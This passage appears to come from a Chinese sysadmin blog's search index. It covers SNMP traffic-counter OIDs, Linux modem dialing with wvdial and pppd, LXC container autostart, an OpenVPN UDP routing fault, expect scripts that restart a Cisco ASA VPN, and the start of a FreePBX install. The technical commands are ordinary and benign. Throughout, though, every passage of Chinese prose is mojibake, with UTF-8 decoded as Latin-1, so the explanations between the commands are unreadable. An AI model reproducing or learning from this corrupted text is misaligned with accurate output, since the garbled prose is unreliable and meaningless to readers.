100Mbpsä»¥ä¸Šå¿…é¡»ä½¿ç”¨Counter64çš„å•ä½ï¼Œç»™ä¸ªå¯¹ç…§è¡¨ï¼š\né«˜é€Ÿç½‘å¡(100å…†ä»¥ä¸Šï¼‰:\nifHCInOctets: 1.3.6.1.2.1.31.1.1.1.6 (64-bit Octets in counter) ifHCOutOctets: 1.3.6.1.2.1.31.1.1.1.10 (64-bit Octets out counter) ifHCInUcastPkts: 1.3.6.1.2.1.31.1.1.1.7 (64-bit Packets in counter) ifHCOutUcastPkts: 1.3.6.1.2.1.31.1.1.1.11 (64-bit Packets out counter) ifHighSpeed: 1.3.6.1.2.1.31.1.1.1.15 (An estimate of the interface\u0026rsquo;s current bandwidth in units of 1Mbps) ä½é€Ÿç½‘å¡ï¼š\nifInOctets: 1.3.6.1.2.1.2.2.1.10 (32-bit Octets in counter) ifOutOctets: 1.3.6.1.2.1.2.2.1.16 (32-bit Octets out counter) ifInUcastPkts: 1.3.6.1.2.1.2.2.1.11 (32-bit Packets in counter) ifOutUcastPkts: 1.3.6.1.2.1.2.2.1.17 (32-bit Packets out counter) ifSpeed: 1.3.6.1.2.1.2.2.1.5 (Currently negotiated speed of the interface - Max: 4.294 Gbps) è¯¦ç»†è§£é‡Šä¸‹ï¼šifInOctetsæ˜¯32-bitæ— ç¬¦æ•´æ•°ï¼Œ2çš„32æ¬¡æ–¹æ˜¯4,294,967,296ã€‚å»æ‰0ï¼Œæ‰€ä»¥èŒƒå›´æ˜¯0-4,294,967,295ï¼Œå¤§æ¦‚æ˜¯34gçš„bit. å¦‚æœæŒ‰ç½‘é€Ÿ74-92Mbpsæ¥ç®—, å¤§æ¦‚6åˆ†é’Ÿå°±ä¼šå¡«æ»¡ï¼Œ92Mbps * 60seconds *6minutes = 33gigabits.æ‰€ä»¥å¡«æ»¡æ˜¯å¾ˆå¿«çš„ï¼Œå¦‚æœä½ æ­£å¥½åœ¨è¿™æœŸé—´è¯»å–æ•°æ®ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè¯»é”™ã€‚\næ‰€ä»¥å‘½ä»¤åº”è¯¥æ˜¯ï¼š\n1snmpwalk -v 2c -c xxxxxxxx 172.16.1.1 1.3.6.1.2.1.31.1.1.1.6.10105 æœ€åé™„ä¸Šè®¡ç®—æµé‡çš„å…¬å¼ï¼š\n1(ifInOctetsCurrent - ifInOctetsPrevious) * 8 / pollingSeconds ","date":"2024-01-08","img":"","permalink":"https://rendoumi.com/posts/20240108-snmp_network/","series":null,"tags":null,"title":"SNMP OIDæ¥ç›‘æ§ç½‘ç»œè®¾å¤‡æµé‡"},{"categories":null,"content":"å…¬å¸ä¸ºäº†è·Ÿå»ºè®¾é“¶è¡Œå»ºç«‹ä¸“çº¿ï¼Œé¦–å…ˆç”¨ç”µè¯çº¿æ‹¨å·è¿›è¡Œæµ‹è¯•ã€‚ ä¹°å›æ¥ä¸€ä¸ªå¤–ç½®çš„Modemï¼Œæ¥åœ¨æœåŠ¡å™¨çš„com1å£ä¸Šï¼Œå…ˆç”¨ç”µè¯æµ‹è¯•ä¸€ä¸‹ï¼ŒOKæ²¡é—®é¢˜ï¼Œé‚£å°±ç»§ç»­é…modemæ‹¨å·\nLinuxä¸‹é…ç½®Modemæ‹¨å·æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¼ ç»Ÿçš„pppdæ–¹å¼å’Œç®€å•çš„wvdialæ–¹å¼ã€‚\nä¸€ã€wvdialé…ç½® wvdialçš„é…ç½®æ–¹æ³•è¶…çº§ç®€å•ï¼Œ æ‰§è¡Œå‘½ä»¤ï¼šwvdialconf /etc/wvdial.conf å®ƒä¼šè‡ªåŠ¨æµ‹å‡ºç³»ç»Ÿçš„Modemï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼ŒåŠ å‡ ä¸ªå‚æ•°ï¼š\n1vi /etc/wvdial.conf 2 3[Dialer Defaults] 4Modem = /dev/ttyS0 5Baud = 115200 6Init1 = ATZ 7Init2 = ATQ0 V1 E1 S0=0 \u0026amp;C1 \u0026amp;D2 +FCLASS=0 8ISDN = 0 9Auto Reconnect = on 10Modem Type = Analog Modem 11Phone =0,28929191 12Username = ttt 13Password = qqq è¿™å°±å¼„å¥½äº†ï¼Œæ‰§è¡Œwvdail \u0026amp;å°±å¯ä»¥æ‹¨å·äº†ï¼Œç»“æŸä¹Ÿå¾ˆç®€å•ï¼Œkill -9 æ€æ‰wvdialå’Œppdè¿›ç¨‹å³å¯ã€‚\næ³¨æ„ï¼šwvdial æ‹¨é€šåç³»ç»Ÿå¤šäº†ä¸€å—ç½‘å¡ppp0ï¼Œè·¯ç”±ä¿¡æ¯éƒ½æœªä¿®æ”¹ï¼Œä¸ºäº†èƒ½åˆ°è¾¾å»ºè¡Œçš„æœåŠ¡å™¨ï¼Œéœ€è¦ç¼–è¾‘/etc/ppp/ip-upæ–‡ä»¶ï¼ŒåŠ ä¸€å¥ï¼š\n1route add -host 12.0.98.150 gw 12.0.98.236 ç„¶åé‡æ‹¨pingä¸€ä¸‹ï¼Œping 12.0.98.150ï¼Œèƒ½pingé€šå°±è¯´æ˜okäº†ã€‚\näºŒã€pppdé…ç½® wvdialéšè—äº†å¾ˆå¤šä¿¡æ¯ï¼Œæˆ‘ä»¬ä¸‹é¢ç”¨pppdæ¥çœ‹çœ‹çœŸå®çš„æ‹¨å·è¿‡ç¨‹å§ï¼š\nå…¶å®modemæ‹¨å·è®¤è¯çš„æ–¹å¼æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯æ˜¾ç¤ºæ˜æ–‡çš„login:(username:)æ–¹å¼ï¼Œå¦ä¸€ç§æ˜¯æ˜¾ç¤ºä¹±ç çš„pap(chap)æ–¹å¼ã€‚\nâ‘ é¦–å…ˆï¼š\n1vi /etc/ppp/options 2lock 3crtscts 4defaultroute 5noauth â‘¡æ¸…ç†ä¸€ä¸‹è€çš„è¿æ¥ï¼š\n1killall pppd 2rm /var/lock/LCK..ttyS0 â‘¢æ‰¾å‡ºè®¤è¯çš„æ–¹å¼ï¼š\n1/usr/sbin/pppd /dev/ttyS0 115200 debug connect 2 \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; \u0026#39;AT\u0026amp;F0\u0026#39; OK 3ATD0,28929191 CONNECT \u0026#39;dc\u0026#39; \u0026#34; less /var/log/messages\nå¦‚æœçœ‹è§ä»€ä¹ˆlogin usernameä¹‹æµçš„é‚£å°±æ˜¯æ˜æ–‡è®¤è¯ï¼Œå¦‚æœç±»ä¼¼ä¸‹é¢çš„ï¼Œçœ‹è§äº†ï¼Œé‚£å°±æ˜¯pap(chap)æ–¹å¼ã€‚\n1pppd 2.4.2 started by root, uid 0 2Removed stale lock on ttyS0 (pid 3561) 3send (AT^M) 4expect (OK) 5AT^M^M 6OK 7-- got it 8send (ATD0,28929191^M) 9expect (CONNECT) 10^M 11ATD0,28929191^M^M 12CONNECT 13-- got it 14send (d) 15Serial connection established. 16using channel 2 17Using interface ppp0 18Connect: ppp0 \u0026lt;--\u0026gt; /dev/ttyS0 19sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] 20rcvd [LCP ConfReq id=0x1 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0xebe7666\u0026gt;] 21sent [LCP ConfAck id=0x1 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0xebe7666\u0026gt;] 22sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] 23sent [LCP ConfReq id=0x1 \u0026lt;mru 552\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;magic 0x3947d7a8\u0026gt; \u0026lt;pcomp\u0026gt; \u0026lt;accomp\u0026gt;] 24rcvd [LCP ConfReq id=0x2 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0x125e3a73\u0026gt;] 25sent [LCP ConfAck id=0x2 \u0026lt;mru 1500\u0026gt; \u0026lt;asyncmap 0x0\u0026gt; \u0026lt;auth chap MD5\u0026gt; \u0026lt;magic 0x125e3a73\u0026gt;] å¦‚æœæ˜¯æ˜æ–‡è®¤è¯ï¼š\n1/usr/sbin/pppd /dev/ttyS0 115200 debug connect 2\u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; ATDT0,28929191 CONNECT 3\u0026#39;\u0026#39; ogin: ttt assword: qqq\u0026#34; å¦‚æœæ˜¯pap(chap)è®¤è¯ï¼š\n1/usr/sbin/pppd /dev/ttyS0 115200 debug 2user ttt connect \u0026#34;/usr/sbin/chat -v \u0026#39;\u0026#39; ATDT0,28929191 CONNECT \u0026#39;dc\u0026#39; \u0026#34; çœ‹å‡ºåŒºåˆ«äº†å§ï¼Œpap(chap)è·Ÿæ˜æ–‡çš„åŒºåˆ«å°±åœ¨äºå¤šäº†ä¸€ä¸ª user ttt çš„å‚æ•°ã€‚ è¿™å°±æ˜¯pppdæ‹¨å·çš„è¯¦ç»†è¿‡ç¨‹äº†ï¼Œæ–­æ‰æ‹¨å·è¿æ¥å°±ç”¨killall pppdå³å¯ã€‚ å¤§å®¶å¯ä»¥æŠŠè¿™ä¹ˆé•¿çš„ä¸€è¡Œå‘½ä»¤å†™åˆ°shé‡Œï¼Œå°±å¥½çœ‹äº†ã€‚\n","date":"2024-01-08","img":"","permalink":"https://rendoumi.com/posts/20240108-modem_dial/","series":null,"tags":null,"title":"Linuxä¸‹é…ç½®Modemæ‹¨å·"},{"categories":null,"content":"æˆ‘ä»¬çš„å®¹å™¨é‡‡ç”¨çš„æ˜¯lxcç±»å‹ï¼Œä¸€æ˜¯ä¸ºäº†å›ºå®šipï¼ŒäºŒæ˜¯é¿å¼€iptableç±»å‹è½¬å‘çš„æ–¹å¼ã€‚å› ä¸ºæˆ‘ä»¬æ˜¯å¼ºç½‘ç»œç®¡ç†ç¯å¢ƒï¼Œç½‘ç»œå·¥ç¨‹å¸ˆå¯¹ç½‘ç»œçš„è§„åˆ’å’Œç®¡æ§éå¸¸å¼ºã€‚\nè¿™ç§æ–¹å¼ä¸‹å¯åŠ¨lxcå®¹å™¨å€’æ˜¯å¾ˆå¥½åŠï¼Œç›´æ¥ç¼–è¾‘/etc/rc.d/rc.local\n1docker start jko2o-16-13-49 2docker start vis-16-13-51 3docker start vis-16-13-50 4docker start vis-16-13-48 5docker start vis-16-13-47 å°±å¯ä»¥å¼€æœºè‡ªåŠ¨å¯åŠ¨å®¹å™¨äº†ã€‚\nå®¹å™¨å†…æˆ‘ä»¬æ˜¯é‡‡ç”¨supervisordä¸»è¿›ç¨‹æ¥ä¿æŒå®¹å™¨ä¸è‡ªåŠ¨é”€æ¯çš„ï¼Œé‚£ä¹ˆå…¶ä»–å‘½ä»¤å¦‚æœéƒ½åŠ å…¥supervisordï¼Œé‚£ä¼šéå¸¸éº»çƒ¦ã€‚\nç®€å•åŒ–ï¼Œç”¨lxc-executeæ¥æ‰§è¡Œï¼Œæ¯”è¾ƒéº»çƒ¦çš„å°±æ˜¯éœ€è¦æŸ¥å‡ºæ¥lxcå®¹å™¨çš„åå­—ï¼Œç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥å‡ºjko2o-16-13-49çš„å…¨åï¼š\n1docker inspect -f \u0026#39;{{.Id}}\u0026#39; jko2o-16-13-49 2ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f ç„¶åç¼–è¾‘/etc/rc.d/rc.localï¼Œç”¨lxc-executeæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼š\n1#47 2lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service mysqld start 3lxc-execute -n e223d81ea73551460b82e1977b92ef07e24437cd1f4494470feafd4ff455104b -- service httpd start 4 5#48 6lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/mysqld start 7lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/httpd start 8lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/wdapache start 9lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/nginxd start 10lxc-execute -n 1075971953b9c79494509bf89131e03bbd5ab0b9a388217bd9b6de7a553016a5 -- //www/wdlinux/init.d/pureftpd start 11 12#49 13lxc-execute -n ebe2e6a1249f6f22334014b0072186dfaee52173f3df06cd826f9e64e7d4c51f -- /export/servers/nginx178/sbin/nginx 14 15#50 16lxc-execute -n 5b7e8cd3130d31bae5b089202c7e2092b9daca5f19cc055ce4ee50cf8b789504 -- /export/servers/tomcat/tomcat.sh ","date":"2024-01-08","img":"","permalink":"https://rendoumi.com/posts/20240108-docker_lxc_startup/","series":null,"tags":null,"title":"Docker Lxcç±»å‹å®¹å™¨è‡ªå¯åŠ¨ä»¥åŠè‡ªåŠ¨æ‰§è¡Œå‘½ä»¤"},{"categories":null,"content":"openvpn server can\u0026rsquo;t use udp port è¿™ä¸ªé—®é¢˜éå¸¸å¤æ€ªï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªæœºæˆ¿ã€‚åˆ†åˆ«åœ¨ä¸¤è¾¹å‡è®¾äº†openvpnæœåŠ¡å™¨ï¼Œä¸€ä¸ªæœºæˆ¿çš„ovpnå°±å®Œå…¨æ­£å¸¸ï¼Œè€Œå¦ä¸€ä¸ªæœºæˆ¿çš„openvpnå¦‚æœæ˜¯tcpå°±æ²¡é—®é¢˜ï¼Œå¦‚æœæ˜¯udpå°±æŠ¥é”™ï¼Œæ— æ³•è¿æ¥ã€‚æŠŠæ­£å¸¸æœºæˆ¿çš„openvpnå®Œå…¨å¤åˆ¶ä¸€ä»½æ‹¿è¿‡å»ï¼Œä¹Ÿæ˜¯ä¸€æ ·æŠ¥é”™ï¼Œå¤ªéƒé—·äº†ï¼\né”™è¯¯æç¤ºæ˜¯ï¼š\n1TLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity) éå¸¸å¤æ€ªå•Šï¼š åœ¨å†…ç½‘ç”¨ncæ¥è¯•éªŒudpæ˜¯å¦æ­£å¸¸ï¼š\n1nc -ul 1194 åœ¨å†…ç½‘éšä¾¿æ‰¾ä¸€å°æœºå™¨æµ‹è¯•ï¼š\n1nc -u xxxx 1194 ç„¶åä¸¤è¾¹éšä¾¿è¾“å…¥å­—ç¬¦æµ‹è¯•ï¼Œæ²¡é—®é¢˜ã€‚\nç„¶åä»å…¬ç½‘æµ‹è¯•ï¼Œå°±å‡ºé—®é¢˜äº†ã€‚ncè¿æ¥ä¸Šä»¥åï¼Œåªèƒ½å‘é€ä¸€æ¬¡æ•°æ®ï¼Œç„¶åç®¡é“å°±æ–­è£‚äº†ï¼Œæ— æ³•å†ä¼ æ•°æ®ã€‚\n1nc -u å…¬ç½‘ip 1194 2aaa 3nc: Write error: Connection refused ç™¾æ€ä¸å¾—å…¶è§£å•Šï¼Œè¯•äº†è‹¥å¹²æ¬¡ï¼Œæ‰å‘ç°é—®é¢˜çš„ç—‡ç»“æ‰€åœ¨ã€‚\né”™è¯¯çš„é‚£å°æœåŠ¡å™¨ï¼Œæœ‰ä¸¤ä¸ªç½‘ç»œåœ°å€ï¼š 172.16.8.4å’Œ172.16.8.1 å…¶ä¸­8.4çš„åœ°å€æ˜¯ç¼ºçœåœ°å€ï¼Œ8.1çš„åœ°å€æ˜¯ç”¨ifconfigæ‰‹åŠ¨åæ·»åŠ çš„ã€‚ è€Œå‰ç«¯é˜²ç«å¢™åšå¾—å…¬ç½‘æ˜ å°„æ˜¯æ˜ å°„åˆ°äº†8.1çš„1194ç«¯å£\ntcpç”±äºåŒæ–¹æ˜¯è¦æ ¡éªŒæ¥å¾€srcåœ°å€çš„ï¼Œæ‰€ä»¥æ²¡é—®é¢˜ï¼Œåˆ°äº†udpï¼Œåªç®¡å‘ä¸ç®¡æ”¶ï¼Œæ‰€ä»¥udpåŒ…å°±ä»8.4çš„ç¼ºçœåœ°å€å‘å‡ºå»ï¼Œå¯¼è‡´åŒæ–¹ä¸ä¸€è‡´ï¼Œæ— æ³•æ­£å¸¸æ¥æ”¶äº†ã€‚\nè§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œåœ¨openvpnæœåŠ¡å™¨ç«¯çš„é…ç½®æ–‡ä»¶ä¸­å¼ºè¡ŒæŒ‡å®šlocalç«¯çš„ipå³å¯ï¼š\n1local 172.16.8.1 ","date":"2024-01-08","img":"","permalink":"https://rendoumi.com/posts/20240108-opnevpn_udp_port/","series":null,"tags":null,"title":"OpenvpnæœåŠ¡å™¨ç«¯æ— æ³•å¼€é€šudpç«¯å£çš„æ•…éšœæ’é™¤"},{"categories":null,"content":"Cisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œé‡å¯ å…¬å¸ä»äº‹ç¬¬ä¸‰æ–¹æ”¯ä»˜å·¥ä½œï¼Œè·Ÿå¾ˆå¤šé“¶è¡Œéƒ½æœ‰åˆä½œå…³ç³»ï¼Œæ‹‰äº†å¾ˆå¤šä¸“çº¿ç›´é€šé“¶è¡Œï¼ŒåŒæ–¹å»ºç«‹VPNï¼Œä¸¤ç«¯éƒ½æ˜¯Ciscoçš„è®¾å¤‡ï¼Œä½†æ˜¯ï¼Œè¿™äº›çº¿è·¯æœ‰æ—¶å€™ä¼šè«åå…¶å¦™çš„æ–­æ‰ï¼Œå…³é”®æ˜¯ç¨‹åºä¸çŸ¥é“å•Šï¼Œè€æ˜¯é‡è¿ï¼Œä¸€ç›´ç­‰åˆ°å®¢æœåæ˜ å®¢æˆ·æŠ•è¯‰ï¼ŒæŸ¥ä¸€åœˆç¨‹åºåæ‰çŸ¥é“ã€‚è¿™åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šå¯æ˜¯è¡Œä¸é€šçš„ï¼Œæ‰¾æ¥äº†æ‰€è°“Ciscoé«˜æ‰‹ï¼Œä¹Ÿæä¸æ˜ç™½ä¸ºä»€ä¹ˆè€æ–­ï¼Œæ²¡åŠæ³•ï¼Œäºæ˜¯å†™äº†ä¸¤ä¸ªç›‘æ§è„šæœ¬ï¼Œä½¿ç”¨Pingæ£€æµ‹VPNå¯¹ç«¯çš„çŠ¶å†µï¼Œä¸€æ—¦Pingä¸é€šï¼Œå°±ç”¨è„šæœ¬ç™»é™†é˜²ç«å¢™ï¼Œè‡ªåŠ¨é‡å¯VPNã€‚\nåœ¨å®‰è£…ä¹‹å‰ï¼Œå…ˆå®‰è£…ä¸€ä¸ªèƒ½ä»å‘½ä»¤è¡Œå‘é€é‚®ä»¶çš„è½¯ä»¶Emailæ¥å‘é€æŠ¥è­¦é‚®ä»¶ï¼Œå¦åˆ™æ¯å°æœºå™¨éƒ½èµ·sendmailï¼Œæ²¡ä»€ä¹ˆå¿…è¦:\n1https://github.com/muquit/mailsend-go 2 3 4#å‘é€å®ä¾‹ 5mailsend-go -smtp smtp.126.com -port 25 \\ 6auth \\ 7 -user xxx@126.com -pass xxx \\ 8 -from xxx@126.com -to \u0026#34;xxx@126.com\u0026#34; \\ 9-sub \u0026#34;Test\u0026#34; \\ 10body -msg \u0026#39;hello world\u0026#39; 11 12126é‚®ç®±è¿™é‡Œçš„å¯†ç ç”¨çš„æ˜¯æˆæƒç  æˆæƒå¯†ç ï¼Œä¸æ˜¯é‚®ç®±å¯†ç  è¯´æ˜ä¸€ä¸‹åœºæ™¯ï¼š\n210.210.210.3æ˜¯å¯¹ç«¯Cisco vpnè®¾å¤‡çš„å…¬ç½‘IP 192.168.101.99æ˜¯å»ºç«‹äº†VPNåï¼Œå¯¹ç«¯æœåŠ¡å™¨çš„ç§ç½‘IPåœ°å€ï¼› 192.168.1.1æ˜¯å·±æ–¹Cisco ASA5520çš„ç§ç½‘åœ°å€ã€‚ 1#!/bin/sh 2 3while [ \u0026#34;1\u0026#34; -eq \u0026#34;1\u0026#34; ] 4do 5 live=`ping -c4 \u0026#34;192.168.101.99\u0026#34;|wc -l` 6 if [ $live -eq 5 ] ; then 7 /usr/local/bin/mailsend-go -debug -to \u0026#34;ranrui.zhang@rendoumi.com\u0026#34; -from monit@ddky.com -ssl -port 465 -smtp smtp.qiye.aliyun.com \\ 8 auth -user \u0026#34;monit@ddky.com\u0026#34; -pass \u0026#34;xxxxxxxx\u0026#34; \\ 9 -sub \u0026#34;vpnæ–­äº†\u0026#34; body -msg \u0026#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ vpnæ–­äº†ï¼ï¼ï¼\u0026#34; \\ 10 -cs \u0026#34;utf-8\u0026#34; 11 /usr/local/bin/revpn.sh 12 echo \u0026#34;`date +%Y`å¹´`date +%m`æœˆ`date +%d`æ—¥ `date +%H`ç‚¹`date +%M`åˆ† 13 çº¿è·¯ä¸èƒ½åˆ°è¾¾ç‹åºœäº•æœºæˆ¿ï¼Œé‡å¯VPNã€‚\u0026#34; 14 sleep 60 15 fi; 16 sleep 60 17done ä»¥ä¸‹æ˜¯ç”¨expectè‡ªåŠ¨ç™»å½•Ciscoè·¯ç”±å™¨é‡å¯vpnçš„è„šæœ¬ revpn.sh\n1#!/usr/bin/expect 2 3set timeout 30 4spawn ssh pix@192.168.1.1 5expect \u0026#34;password:\u0026#34; 6send \u0026#34;xxxxxxxx\\n\u0026#34; 7expect \u0026#34;ASAtoTelecom\u0026gt;\u0026#34; 8send \u0026#34;en\\n\u0026#34; 9expect \u0026#34;Password:\u0026#34; 10send \u0026#34;xxxxxxxx\\n\u0026#34; 11expect \u0026#34;ASAtoTelecom#\u0026#34; 12send \u0026#34;clear isakmp sa\\n\u0026#34; 13expect \u0026#34;ASAtoTelecom#\u0026#34; 14send \u0026#34;clear ipsec sa peer 210.210.210.3\\n\u0026#34; 15expect \u0026#34;ASAtoTelecom#\u0026#34; 16send \u0026#34;exit\\n\u0026#34; 17expect eof 18exit 0 ","date":"2024-01-08","img":"","permalink":"https://rendoumi.com/posts/20240107-vpn_monitor/","series":null,"tags":null,"title":"Cisco ASA5520 VPNçº¿è·¯çš„ç›‘æ§å’Œè‡ªåŠ¨é‡å¯"},{"categories":null,"content":"æ–°çš„ä¸€å¹´ä¾å§‹ï¼Œå¼€å§‹å®šå¥½äº†æ—…è¡Œè®¡åˆ’ï¼Œä½†æ˜¯æœ‰ä¸ªä¸œè¥¿å´ä¾ç„¶å¿ƒç¥ä¸å®ã€‚\né‚£å°±æ˜¯ä¸‡ä¸€åœ¨å›½å¤–æœ‰ä»€ä¹ˆå˜åŠ¨ï¼Œå¦‚ä½•å¾€å›½å†…æ‰“ç”µè¯å‘¢ï¼Ÿï¼\nè¯´åˆ°è¿™é‡Œï¼Œä¸å¾—ä¸æä¸ªä¸œè¥¿ï¼Œé‚£å°±æ˜¯æ—…é¡ºçš„Appï¼Œè¿™ä¸ªä¸œè¥¿å·²ç»æ¶ˆå¤±äº†ï¼Œä½†æ˜¯ç»å¯¹å€¼å¾—è¢«è®°ä½å•Šã€‚\nè¿™ä¸ªä¸œè¥¿åœ¨å¡ç­å²›æ—…æ¸¸çš„æ—¶å€™æ›¾ç»æ•‘äº†è‡ªå·±ä¸¤æ¬¡\né¦–å…ˆæ˜¯å®ƒçš„ç¬¬ä¸€ä»£äº§å“ï¼š\nç¬¬ä¸€ä»£çš„åŸç†ä¼¼ä¹æ˜¯æŠŠæ‰‹æœºçš„ä¿¡å·ç›´æ¥é€šè¿‡ç½‘ç»œè½¬ç§»åˆ°äº†å›½å†…ï¼Œéšèº«æºå¸¦ç„¶åé…åˆappä½¿ç”¨ï¼Œè¿™ç‚¹éå¸¸ç‰›å§ï¼å›½å†…çš„çªœå‡ºç‚¹ä¼šéšæœºï¼Œå¿½è€Œå¤©æ´¥ï¼Œå¿½è€Œåˆ«çš„åœ°æ–¹ï¼Œæ‰€ä»¥å‘¼å‡ºç”µè¯æä¸å¥½æ˜¯é•¿é€”è®¡è´¹ã€‚ç¬¬ä¸€æ¬¡å‘¢å…«æˆ’æ˜¯åœ¨å¡ç­å²›ä¸­éƒ¨é‚£ä¸ªéº¦å½“åŠ³é™„è¿‘ï¼Œç”¨è¿™ä¸ªæ¥åˆ°äº†å›½å†…çš„ç”µè¯ï¼Œè¯´æ˜¯å‡ºå¤§äº‹äº†ï¼Œæœ‰äººæŠŠå…¬å¸æ•°æ®åº“çš„æ•°æ®ç»™æ”¹äº†ï¼Œå½“æ—¶çº¦å®šä¸‹åˆ6ï¼š00å†æ‰“ï¼Œç„¶åä¸‹åˆåœ¨å°æ¹¾ç‰›è‚‰é¢çš„åº—é‡Œï¼Œåˆç”¨è¿™ä¸ªå¾€å›½å†…é€šäº†ç”µè¯ï¼Œæ‰“äº†åŠä¸ªå¤šå°æ—¶ï¼Œé¢†å¯¼å‘ŠçŸ¥äº†å…·ä½“çš„æƒ…å†µï¼Œè¦æ˜¯æ¥ä¸èµ·æ¥é‚£å¯çœŸå°±éº»çƒ¦å¤§äº†ã€‚\nè¿™ä¸ªæ˜¯å®ƒç¬¬äºŒä»£çš„äº§å“ï¼š\nè¿™ä¸ªæ˜¯å‡çº§ç‰ˆproï¼Œå°±æ›´å‰å®³äº†ï¼Œç›´æ¥æ”¾å®¶é‡Œï¼Œæ‰‹æœºä¸Šä¸‹ä¸ªappï¼Œæœ‰ç½‘ç»œå°±èƒ½ç”¨äº†ï¼Œä¸ç”¨åƒç¬¬ä¸€ä»£ä¸€æ ·éšèº«æºå¸¦äº†ã€‚\nè¿™ä¸ªæ›´æ˜¯æ•‘å‘½äº†ï¼Œè¯è¯´ç¬¬äºŒå›åœ¨å¡ç­çš„æ—¶å€™æ­£æ˜¯ç–«æƒ…åˆšå‘ä½œçš„æ—¶å€™ï¼Œå¡ç­ç›´æ¥å°å²›äº†ï¼Œç„¶åå¥½å¤šèˆªç­éƒ½å»¶æœŸæˆ–ç»ˆæ­¢äº†ï¼Œå°±æ˜¯ç”¨è¿™ä¸ªæ—…é¡ºæ‰“å›½å†…ç”µè¯æ”¹ç­¾äº†å›å›½çš„æœºç¥¨ï¼Œè¶³è¶³æ‰“äº†ä¸¤ä¸ªå°æ—¶å•Šï¼Œåˆ°å¤„å çº¿ç­‰å¾…ï¼Œå¦‚æœæ‰“å›½é™…é•¿é€”çš„è¯è´¹ç”¨ä¸å ªè®¾æƒ³ï¼Œå¦å¤–æ‰“å¡ç­å¤§éŸ©èˆªç©ºçš„ç”µè¯æ”¹ç­¾ä¸¤ç¨‹æœºç¥¨ä¹Ÿæ˜¯ä¸å¯æƒ³åƒçš„ï¼Œæ‰€ä»¥ï¼Œå…³é”®æ—¶åˆ»æ˜¯çœŸçš„æ•‘å‘½å•Šã€‚\nè¿™ä¹ˆå¥½çš„è½¯ä»¶å´ç›´æ¥å€’é—­æ¶ˆå¤±äº†ï¼ŒçœŸæ˜¯ä¸‡åˆ†å¯æƒœå•Šã€‚\nå“ï¼Œç°åœ¨æ²¡æœ‰è¿™ä¸ªäº†ï¼Œåªèƒ½è‡ªå·±æ­ä¸€ä¸ªvoipç”µè¯è‡ªç”¨äº†ã€‚\nåˆšå¼€å§‹æ˜¯è€ƒè™‘RasPBXï¼Œå…¶å®è‡ªå·±ç”¨æ ‘è“æ´¾æ­è¿‡ï¼Œè´¹äº‹ä¸è¯´ï¼Œä¸»è¦æ ‘è“æ´¾å®¹æ˜“æ­»æœºï¼ŒåŠ¡å¿…è¦ç¨³å®šï¼Œæ‰€ä»¥å¹²è„†ç”¨FreePBXæ­å»ºåœ¨kvmæœåŠ¡å™¨è™šæ‹Ÿæœºä¸Šçš„æ–¹å¼ï¼Œæ¥ä¿æŒç»å¯¹ç¨³å®šã€‚\nä»¥ä¸‹æ•™ç¨‹åªé€‚ç”¨äº FreePBX 16 çš„å®˜æ–¹ISOï¼Œå…·ä½“åšæ³•å¦‚ä¸‹ï¼š\nä¸€ã€å®‰è£…KVMè™šæœºï¼š 1#ä¸‹è½½FreePBX16çš„isoå…‰ç›˜ 2wget https://downloads.freepbxdistro.org/ISO/SNG7-PBX16-64bit-2302-1.iso 3 4#åˆ›å»ºqcow2è™šæœºæ–‡ä»¶ 5qemu-img create -f qcow2 freepbx-8-2-60/freepbx-8-2-60.qcow2 20G 6 7virt-install \\ 8--name=freepbx-8-2-60 \\ 9--vcpu=4 \\ 10--ram=8096 \\ 11--disk path=/export/kvm/freepbx-8-2-60/freepbs-8-2-60.qcow2,format=qcow2,size=20 \\ 12--cdrom=/export/kvm/SNG7-PBX16-64bit-2302-1.iso \\ 13--network bridge=br0 \\ 14--os-type=linux \\ 15--vnc --vnclisten=0.0.0.0 --vncport=5916 ç”¨vncè¿æ¥5916ç«¯å£å®‰è£…ï¼Œè®¾ç½®ä¸€ä¸‹rootçš„å¯†ç å®‰è£…ã€‚\nè¿™æ 